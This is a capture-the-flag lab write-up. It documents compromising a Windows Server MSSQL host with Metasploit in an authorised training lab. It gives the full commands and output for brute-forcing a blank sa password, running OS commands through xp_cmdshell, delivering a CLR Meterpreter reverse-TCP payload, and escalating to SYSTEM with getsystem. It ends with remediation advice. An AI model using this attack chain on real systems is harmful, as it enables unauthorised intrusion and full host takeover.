# Host & Network Penetration Testing: The Metasploit Framework CTF 1
### Capture The Flag Lab Writeup

---

## Table of Contents

1. [Introduction](#1-introduction)
2. [Lab Environment Overview](#2-lab-environment-overview)
3. [Initial Reconnaissance — Service Enumeration](#3-initial-reconnaissance--service-enumeration)
4. [Flag 1 — MSSQL Credential Brute-Force and xp_cmdshell Execution](#4-flag-1--mssql-credential-brute-force-and-xp_cmdshell-execution)
5. [Flag 2 — CLR Payload Escalation to Meterpreter and SYSTEM Privilege Escalation](#5-flag-2--clr-payload-escalation-to-meterpreter-and-system-privilege-escalation)
6. [Flag 3 — Recursive Filesystem Search via xp_cmdshell](#6-flag-3--recursive-filesystem-search-via-xp_cmdshell)
7. [Flag 4 — Administrator Desktop Enumeration](#7-flag-4--administrator-desktop-enumeration)
8. [Summary of Findings](#8-summary-of-findings)
9. [Conclusions and Lessons Learned](#9-conclusions-and-lessons-learned)

---

## 1. Introduction

This report documents the methodology, tools, and findings from a Capture The Flag (CTF) lab exercise titled **Host & Network Penetration Testing: The Metasploit Framework CTF 1**, completed as part of a structured penetration testing curriculum. The lab presented a single Windows Server target running a Microsoft SQL Server instance, requiring a staged attack chain from unauthenticated database access through to full SYSTEM-level privilege escalation.

The attack progression in this lab is representative of a classic Windows database server compromise scenario:

1. **Initial access** via brute-forced MSSQL credentials against the `sa` (System Administrator) account.
2. **Command execution** through the SQL Server `xp_cmdshell` extended stored procedure.
3. **Privilege escalation** from the SQL Server service account to `NT AUTHORITY\SYSTEM` using the Metasploit `getsystem` technique, enabled by the `SeImpersonatePrivilege` token privilege.
4. **Full filesystem enumeration** across protected system directories and the Administrator user profile.

The primary tool throughout was the **Metasploit Framework**, used for credential brute-forcing, session management, CLR payload delivery, and privilege escalation — supplemented by manual SQL query execution and Windows shell commands for filesystem navigation.

All activities were performed within an isolated, authorised lab environment. No live or production systems were involved.

---

## 2. Lab Environment Overview

| Parameter         | Details                                              |
|-------------------|------------------------------------------------------|
| Attacker Machine  | Kali Linux (GUI access provided)                     |
| Target Hostname   | `target.ine.local`                                   |
| Target IP         | `10.2.27.77`                                         |
| Attacker IP       | `10.10.37.2`                                         |
| Target OS         | Microsoft Windows Server 2012 R2 (Version 6.3.9600)  |
| MSSQL Version     | Microsoft SQL Server 2012 SP3 (11.00.6020)           |

### Tools Used

| Tool                        | Purpose                                                         |
|-----------------------------|-----------------------------------------------------------------|
| `nmap`                      | Port scanning and service version detection                     |
| Metasploit Framework        | MSSQL brute-force, session management, CLR payload delivery     |
| `mssql_login` module        | Credential brute-force against the MSSQL service                |
| `mssql_clr_payload` module  | CLR-based Meterpreter payload delivery via authenticated MSSQL  |
| Meterpreter (`getsystem`)   | Privilege escalation via Named Pipe Impersonation               |
| Windows Shell (`cmd.exe`)   | Filesystem enumeration and flag retrieval                       |

### Objectives

| Flag   | Hint                                                                                  |
|--------|---------------------------------------------------------------------------------------|
| Flag 1 | Gain access to the MSSQLSERVER account and retrieve the first flag.                   |
| Flag 2 | Locate the second flag within the Windows configuration folder.                       |
| Flag 3 | Find the third flag within the system directory; it contains a hint for the final flag.|
| Flag 4 | Investigate the Administrator directory to find the fourth flag.                      |

---

## 3. Initial Reconnaissance — Service Enumeration

A full TCP port scan with service version detection was performed against the target to map the complete attack surface.

### Command Used

```bash
nmap -sV -p- target.ine.local
```

### Results

```
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020; SP3
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152–49191/tcp open msrpc         Microsoft Windows RPC (multiple instances)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012
```

### Analysis

The scan revealed a Windows Server host with several services of note:

- **MSSQL (port 1433):** Microsoft SQL Server 2012 SP3, the primary target. The `sa` (System Administrator) account is a built-in SQL Server login with the highest level of database privileges. If not disabled or secured with a strong password, it represents an immediate brute-force target.
- **SMB (ports 139 and 445):** Windows file-sharing services, useful for lateral movement post-compromise.
- **RDP (port 3389):** Remote Desktop Protocol, a potential post-exploitation access method with SYSTEM-level credentials.
- **WinRM (port 5985):** Windows Remote Management, accessible for remote PowerShell execution with valid credentials.

The presence of an exposed MSSQL service with the default `sa` account made this the clear primary attack vector. A Metasploit workspace and global host variables were configured before proceeding:

```
msf6 > service postgresql start
msf6 > msfconsole
msf6 > setg RHOSTS target.ine.local
```

---

## 4. Flag 1 — MSSQL Credential Brute-Force and xp_cmdshell Execution

### Hint

> *"Gain access to the MSSQLSERVER account on the target machine to retrieve the first flag."*

### Methodology

SQL Server's `sa` account is the built-in system administrator login, analogous to the `root` account in MySQL. In many legacy or poorly configured SQL Server deployments, the `sa` account is left enabled with a weak or blank password. The Metasploit `mssql_login` scanner module was used to test the `sa` account against a standard Unix password wordlist.

### Step 1: Brute-Force MSSQL Credentials

```
msf6 > use auxiliary/scanner/mssql/mssql_login
```

The module was pre-populated with the global `RHOSTS` value. Key options confirmed before running:

| Option        | Value                                                            |
|---------------|------------------------------------------------------------------|
| `USERNAME`    | `sa`                                                             |
| `PASS_FILE`   | `/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt` |
| `RPORT`       | `1433`                                                           |
| `BLANK_PASSWORDS` | `true`                                                       |
| `CreateSession` | `true`                                                         |

```
msf6 auxiliary(scanner/mssql/mssql_login) > run
```

**Output:**

```
[+] 10.2.27.77:1433 - Login Successful: WORKSTATION\sa:
[*] MSSQL session 1 opened (10.10.37.2:43003 -> 10.2.27.77:1433)
[*] Bruteforce completed, 1 credential was successful.
[*] 1 MSSQL session was opened successfully.
```

The `sa` account was found to use a **blank password** — no password at all — confirming authentication with an empty credential. A live MSSQL session was automatically opened by the module.

### Step 2: Execute Commands via xp_cmdshell

`xp_cmdshell` is a SQL Server extended stored procedure that executes operating system commands in the context of the SQL Server service account and returns the output as a query result set. Connecting to the established MSSQL session, the current execution identity was confirmed first:

```sql
EXEC xp_cmdshell "whoami";
```

**Output:**

```
nt service\mssqlserver
```

The commands were running as `NT Service\MSSQLSERVER` — the SQL Server service account. The C: drive root was then enumerated:

```sql
EXEC xp_cmdshell "dir C:\";
```

**Relevant Output:**

```
06/26/2026  10:01 AM    34    flag1.txt
```

The flag file was present directly in the C: drive root, accessible to the MSSQLSERVER service account.

### Step 3: Retrieve Flag 1

```sql
EXEC xp_cmdshell "type C:\flag1.txt";
```

```
FLAG1_{######################################}
```

### Analysis

The `sa` account with a blank password is one of the most frequently encountered misconfigurations on MSSQL servers and represents a critical vulnerability. SQL Server's default installation prompts for a strong `sa` password, but many legacy deployments or poorly executed migrations leave it blank or set it to a trivially guessable value. Combined with `xp_cmdshell` being enabled — which SQL Server disables by default for security reasons but which is often re-enabled by administrators for convenience — this configuration provided immediate operating system-level command execution without any additional exploitation step.

### Flag Captured

```
FLAG1_{######################################}
```

---

## 5. Flag 2 — CLR Payload Escalation to Meterpreter and SYSTEM Privilege Escalation

### Hint

> *"Locate the second flag within the Windows configuration folder."*

### Methodology

The `C:\Windows\System32\config` directory is protected by default Windows access controls and is accessible only to `NT AUTHORITY\SYSTEM` and members of the Administrators group. The MSSQLSERVER service account did not have sufficient privileges to access it. Two steps were therefore required: first, escalate the MSSQL session to a full Meterpreter session for richer post-exploitation capabilities; then, use Meterpreter's `getsystem` command to elevate to SYSTEM.

### Step 1: Deliver a CLR-Based Meterpreter Payload

The `windows/mssql/mssql_clr_payload` module delivers a Meterpreter payload by exploiting SQL Server's **Common Language Runtime (CLR)** integration — a feature that allows .NET assemblies to be loaded and executed directly within SQL Server. The module temporarily enables `TRUSTWORTHY` and CLR settings on the database, loads a custom .NET assembly as a stored procedure, executes it to spawn the reverse shell, and then cleans up all artefacts.

```
msf6 > use exploit/windows/mssql/mssql_clr_payload
msf6 exploit(windows/mssql/mssql_clr_payload) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/mssql/mssql_clr_payload) > set LHOST 10.10.37.2
msf6 exploit(windows/mssql/mssql_clr_payload) > run
```

**Output:**

```
[*] Database does not have TRUSTWORTHY setting on, enabling ...
[*] Database does not have CLR support enabled, enabling ...
[*] Using version v3.5 of the Payload Assembly
[*] Adding custom payload assembly ...
[*] Exposing payload execution stored procedure ...
[*] Executing the payload ...
[*] Removing stored procedure ...
[*] Removing assembly ...
[*] Sending stage (201798 bytes) to 10.2.27.77
[*] Restoring CLR setting ...
[*] Restoring Trustworthy setting ...
[*] Meterpreter session 3 opened (10.10.37.2:4444 -> 10.2.27.77:49576)
```

A 64-bit Meterpreter session was established. The execution identity was confirmed:

```
meterpreter > getuid
Server username: NT Service\MSSQLSERVER
```

### Step 2: Confirm Exploitable Privileges

The token privileges available to the current process were enumerated:

```
meterpreter > getprivs
```

**Output (relevant privileges):**

```
SeAssignPrimaryTokenPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

The presence of **`SeImpersonatePrivilege`** is the critical finding. This privilege — commonly held by SQL Server service accounts, IIS application pool accounts, and other Windows service identities — allows a process to impersonate any security token it can obtain a handle to, including the SYSTEM token. It is the prerequisite for a class of local privilege escalation techniques collectively known as **token impersonation attacks** (including Potato exploits and Named Pipe Impersonation), all of which reliably escalate a service account to `NT AUTHORITY\SYSTEM`.

### Step 3: Escalate to SYSTEM

```
meterpreter > getsystem
```

**Output:**

```
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
```

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

SYSTEM-level access was achieved. Technique 5, Named Pipe Impersonation via the PrintSpooler service, is a well-established `SeImpersonatePrivilege` escalation technique that exploits the Windows print spooler's habit of authenticating to attacker-controlled named pipes using the SYSTEM account token.

### Step 4: Access the config Directory and Retrieve Flag 2

A Windows shell was spawned from the SYSTEM-level Meterpreter session:

```
meterpreter > shell
```

```cmd
C:\Windows\system32> cd config
C:\Windows\System32\config> dir .
```

**Relevant Output:**

```
06/26/2026  10:01 AM    34    flag2.txt
```

```cmd
C:\Windows\System32\config> type flag2.txt
FLAG2_{######################################}
```

### Analysis

The escalation from `NT Service\MSSQLSERVER` to `NT AUTHORITY\SYSTEM` was achieved entirely through legitimate Windows privilege mechanics — no software vulnerability was exploited. `SeImpersonatePrivilege` is by design available to service accounts that need to act on behalf of authenticated users, but it is routinely abused as a privilege escalation vector. Microsoft has acknowledged this behaviour but considers it by-design for service accounts. The appropriate mitigation is to run SQL Server under a purpose-created, minimally privileged service account rather than a built-in service identity, and to enable Windows Defender Credential Guard and token binding where feasible.

### Flag Captured

```
FLAG2_{######################################}
```

---

## 6. Flag 3 — Recursive Filesystem Search via xp_cmdshell

### Hint

> *"The third flag is also hidden within the system directory. Find it to uncover a hint for accessing the final flag."*

### Methodology

The hint indicated that Flag 3 was somewhere within the Windows system directory tree but did not specify an exact path. Rather than manually browsing directory by directory, a recursive file search was performed directly through the MSSQL `xp_cmdshell` interface using the Windows `dir` command with the `/S` (recursive) and `/B` (bare format) flags to enumerate all `.txt` files under `C:\Windows`.

### Step 1: Recursive Search for .txt Files

Returning to the active MSSQL session:

```sql
EXEC xp_cmdshell "dir /S /B C:\Windows\*.txt";
```

**Output:**

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\ThirdPartyNotices.txt
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ThirdPartyNotices.txt
C:\Windows\System32\catroot2\dberr.txt
C:\Windows\System32\drivers\gmreadme.txt
C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
```

The file `EscaltePrivilageToGetThisFlag.txt` in `C:\Windows\System32\drivers\etc\` stood out immediately — its filename was a deliberate hint confirming that privilege escalation was the prerequisite for Flag 4 (already completed in the Flag 2 phase).

### Step 2: Retrieve Flag 3

```sql
EXEC xp_cmdshell "type C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt";
```

**Output:**

```
FLAG3_{######################################}
```

### Analysis

The use of `xp_cmdshell` for recursive filesystem searches demonstrates the broad operating system access that an authenticated MSSQL session provides. The `dir /S /B` command is a simple but effective enumeration technique for locating files of interest across a Windows filesystem without requiring a full Meterpreter session. The filename `EscaltePrivilageToGetThisFlag.txt` served as an embedded hint, reinforcing the lab's narrative that privilege escalation was the necessary path to the final flag — a technique that had already been completed during the Flag 2 phase, meaning Flag 4 was immediately accessible.

### Flag Captured

```
FLAG3_{######################################}
```

---

## 7. Flag 4 — Administrator Desktop Enumeration

### Hint

> *"Investigate the Administrator directory to find the fourth flag."*

### Methodology

With `NT AUTHORITY\SYSTEM` already obtained during the Flag 2 phase, the SYSTEM account has unrestricted read access to all user profile directories, including `C:\Users\Administrator\`. The hint directed investigation to the Administrator directory specifically. Using the active SYSTEM-level shell, the directory was navigated and enumerated.

### Step 1: Enumerate the Administrator User Directory

```cmd
C:\Users\Administrator> dir .
```

**Output:**

```
01/09/2025  07:12 AM    <DIR>    Contacts
01/09/2025  07:12 AM    <DIR>    Desktop
01/09/2025  07:12 AM    <DIR>    Documents
01/09/2025  07:12 AM    <DIR>    Downloads
01/09/2025  07:12 AM    <DIR>    Favorites
01/09/2025  07:12 AM    <DIR>    Links
01/09/2025  07:12 AM    <DIR>    Music
01/09/2025  07:12 AM    <DIR>    Pictures
12/15/2024  02:29 PM         13  query
01/09/2025  07:12 AM    <DIR>    Saved Games
01/09/2025  07:12 AM    <DIR>    Searches
01/09/2025  07:12 AM    <DIR>    Videos
```

No flag was present at the top level of the Administrator profile. The `Desktop` subdirectory was the next logical location, as it is among the most commonly used locations for file storage by Windows administrators.

### Step 2: Enumerate the Desktop and Retrieve Flag 4

```cmd
C:\Users\Administrator\Desktop> dir .
```

**Output:**

```
06/26/2026  10:01 AM    34    flag4.txt
```

```cmd
C:\Users\Administrator\Desktop> type flag4.txt
FLAG4_{######################################}
```

### Analysis

The flag was accessible immediately as a consequence of the SYSTEM-level privilege escalation performed during the Flag 2 phase. `NT AUTHORITY\SYSTEM` supersedes all user-level access controls on a Windows system, including those protecting user profile directories. In a real-world engagement, the Administrator's Desktop, Documents, and Downloads folders are high-value targets that routinely contain credentials, SSH keys, RDP configuration files, sensitive documents, and notes — making them a standard point of interest in any post-exploitation enumeration workflow.

### Flag Captured

```
FLAG4_{######################################}
```

---

## 8. Summary of Findings

| Flag   | Location                                          | Access Level Required | Discovery Technique                           | Risk     |
|--------|---------------------------------------------------|-----------------------|-----------------------------------------------|----------|
| Flag 1 | `C:\flag1.txt`                                    | MSSQLSERVER (service) | xp_cmdshell → `dir C:\` → `type`             | Critical |
| Flag 2 | `C:\Windows\System32\config\flag2.txt`            | NT AUTHORITY\SYSTEM   | CLR payload → Meterpreter → `getsystem`       | Critical |
| Flag 3 | `C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt` | MSSQLSERVER (service) | xp_cmdshell recursive `dir /S /B` | High |
| Flag 4 | `C:\Users\Administrator\Desktop\flag4.txt`        | NT AUTHORITY\SYSTEM   | SYSTEM shell → Desktop enumeration            | Critical |

### Vulnerabilities Identified

1. **Blank `sa` Password on MSSQL (Critical)** — The SQL Server `sa` account was configured with no password, allowing unauthenticated access via any MSSQL client or Metasploit brute-force module. This represents a complete failure of database authentication and grants an attacker full `sysadmin` privileges over the database engine.

2. **`xp_cmdshell` Enabled (Critical)** — The `xp_cmdshell` extended stored procedure was enabled on the SQL Server instance. This feature is disabled by default precisely because it transforms a database-level compromise into an operating system-level one. With `xp_cmdshell` active, any user with `sysadmin` privileges can execute arbitrary commands on the host OS under the SQL Server service account identity.

3. **`SeImpersonatePrivilege` Leading to SYSTEM Escalation (Critical)** — The MSSQLSERVER service account held `SeImpersonatePrivilege`, a privilege that enabled escalation to `NT AUTHORITY\SYSTEM` via Named Pipe Impersonation (Meterpreter `getsystem` technique 5). While this privilege is inherent to many Windows service accounts, its combination with the initial MSSQL compromise produced a complete host takeover.

4. **MSSQL Running Under a Privileged Service Account (High)** — Running SQL Server under `NT Service\MSSQLSERVER` — a highly privileged identity — amplified the impact of the initial compromise. A dedicated, minimally privileged service account with no `SeImpersonatePrivilege` would have significantly constrained the attacker's ability to escalate.

5. **Sensitive Files Stored in Accessible Locations (Medium)** — Flag files were placed in the C: drive root, the `config` directory, the `drivers\etc` directory, and the Administrator Desktop — locations that are accessible at varying privilege levels and reflect realistic patterns of poor file storage hygiene on Windows servers.

---

## 9. Conclusions and Lessons Learned

This lab demonstrated a complete, end-to-end Windows server compromise starting from a single unauthenticated network service — MSSQL with a blank `sa` password — and progressing through command execution, session upgrade, and privilege escalation to full SYSTEM access. The entire chain was executed using the Metasploit Framework, showcasing how its integrated modules handle each phase of an attack cohesively.

### Attack Chain Summary

```
Nmap Scan
    └─► MSSQL 2012 SP3 on port 1433 identified
            └─► mssql_login → sa: (blank password) — MSSQL session opened
                    └─► xp_cmdshell "dir C:\" → flag1.txt
                            └─► FLAG 1

mssql_clr_payload → Meterpreter session (NT Service\MSSQLSERVER)
    └─► getprivs → SeImpersonatePrivilege confirmed
            └─► getsystem (Named Pipe Impersonation, Technique 5)
                    └─► NT AUTHORITY\SYSTEM
                            └─► shell → C:\Windows\System32\config\flag2.txt
                                    └─► FLAG 2

xp_cmdshell "dir /S /B C:\Windows\*.txt"
    └─► C:\Windows\System32\drivers\etc\EscaltePrivilageToGetThisFlag.txt
            └─► FLAG 3 (+ confirms privilege escalation required for Flag 4)

SYSTEM shell → C:\Users\Administrator\Desktop\flag4.txt
    └─► FLAG 4
```

### Key Takeaways

- **The `sa` account must never use a blank or weak password.** SQL Server setup explicitly prompts for a strong `sa` password, and many deployment checklists enforce this. In practice, legacy migrations and development environments frequently leave it blank. The `sa` account should be disabled entirely where Windows Authentication mode is sufficient, and SQL Server should be configured for Windows Authentication only where possible.

- **`xp_cmdshell` should be disabled in all production environments.** Microsoft disables it by default. It should only ever be enabled temporarily for specific administrative tasks and immediately disabled afterwards. Its presence represents a direct bridge between database-level access and operating system command execution.

- **`SeImpersonatePrivilege` is a reliable SYSTEM escalation path on Windows service accounts.** Any engagement that achieves code execution under a Windows service account should immediately check for this privilege. The appropriate mitigations include running SQL Server and IIS under purpose-created service accounts with minimal permissions, and enabling protections such as Windows Defender Credential Guard.

- **MSSQL service accounts should be purpose-built and minimally privileged.** Using `NT Service\MSSQLSERVER` or `NETWORK SERVICE` for SQL Server provides more privilege than is typically required for the database to function. A domain service account with only the permissions the database engine actually needs reduces the blast radius of a compromise significantly.

- **Recursive filesystem searches are a high-efficiency post-exploitation technique.** The `dir /S /B` command executed via `xp_cmdshell` enumerated the entire `C:\Windows` directory tree for `.txt` files in a single query, locating the non-obvious `EscaltePrivilageToGetThisFlag.txt` file instantly. Equivalent techniques in Meterpreter (`search -f *.txt`) and PowerShell (`Get-ChildItem -Recurse`) should be part of any standard post-exploitation enumeration workflow on Windows targets.

---

*Report completed: June 26, 2026*
*Lab: Host & Network Penetration Testing: The Metasploit Framework CTF 1*
*Platform: INE Security / eLearnSecurity*
